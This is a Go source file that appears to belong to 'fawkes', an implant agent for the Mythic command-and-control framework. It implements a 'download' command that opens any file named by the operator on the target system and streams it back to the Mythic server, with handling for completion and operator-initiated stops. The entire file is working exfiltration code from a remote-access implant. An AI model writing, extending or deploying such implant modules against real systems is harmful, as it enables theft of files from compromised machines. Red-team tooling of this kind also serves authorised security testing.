package commands

import (
	"fmt"
	"os"
	"path/filepath"
	"time"

	"fawkes/pkg/structs"
)

// DownloadCommand implements the download command
type DownloadCommand struct{}

// Name returns the command name
func (c *DownloadCommand) Name() string {
	return "download"
}

// Description returns the command description
func (c *DownloadCommand) Description() string {
	return "Download a file from the target system"
}

// Execute executes the download command
func (c *DownloadCommand) Execute(task structs.Task) structs.CommandResult {
	path := task.Params

	// Get absolute path
	fullPath, err := filepath.Abs(path)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error resolving path: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Open file
	file, err := os.Open(fullPath)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error opening file: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Get file info
	fi, err := file.Stat()
	if err != nil {
		file.Close()
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error getting file size: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Send file to Mythic
	downloadMsg := structs.SendFileToMythicStruct{
		Task:                  &task,
		IsScreenshot:          false,
		SendUserStatusUpdates: true,
		File:                  file,
		FileName:              fi.Name(),
		FullPath:              fullPath,
		FinishedTransfer:      make(chan int, 2),
	}

	task.Job.SendFileToMythic <- downloadMsg

	// Wait for transfer to complete
	for {
		select {
		case <-downloadMsg.FinishedTransfer:
			return structs.CommandResult{
				Output:    "Finished downloading",
				Status:    "success",
				Completed: true,
			}
		case <-time.After(1 * time.Second):
			if task.DidStop() {
				return structs.CommandResult{
					Output:    "Download stopped by user",
					Status:    "error",
					Completed: true,
				}
			}
		}
	}
}
